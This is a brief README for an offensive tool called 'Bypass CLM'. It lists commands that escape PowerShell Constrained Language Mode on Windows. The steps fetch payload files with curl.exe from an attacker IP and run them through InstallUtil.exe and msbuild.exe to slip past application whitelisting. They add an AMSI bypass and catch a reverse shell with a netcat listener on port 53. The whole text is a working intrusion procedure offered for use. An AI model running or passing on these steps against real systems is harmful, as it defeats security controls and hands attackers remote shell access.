# Name
Bypass CLM

## Usage
```
2 Methods
1. bypass_clm_rev_shell, using InstallUtil
    1.1 Built-in PS Rev Shell
        1.1.1 Edit line 20 with attacker's IP and port
        1.1.2 curl.exe http://192.168.45.198/bypass_clm_rev_shell.exe --output bypass_clm_rev_shell.exe
        1.1.3 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "bypass_clm_rev_shell.exe"
        1.1.2 nc -lvp 53 

    1.2 Simple_ps_revshell.ps1 with AMSI bypass
        1.2.1 Comment out lines 20-40
        1.2.2 Uncomment line 42
        1.2.3 Edit "rev" in line 47 to "cmd" 
        1.2.4 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "bypass_clm_rev_shell.exe"
        1.2.5 nc -lvp 53 

2. FullBypass.csproj, using msbuild
    2.1 Edit line 168 with runall.ps1 (amsi bypass + simple_ps_revshell.ps1)
    2.2 curl.exe http://192.168.45.198/FullBypass.csproj -o FullBypass.csproj 
    2.3 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj
    2.4 nc -lvp 53
```

## Source
https://notes.morph3.blog/windows/bypass-evasion-techniques
https://github.com/beauknowstech/FullBypass
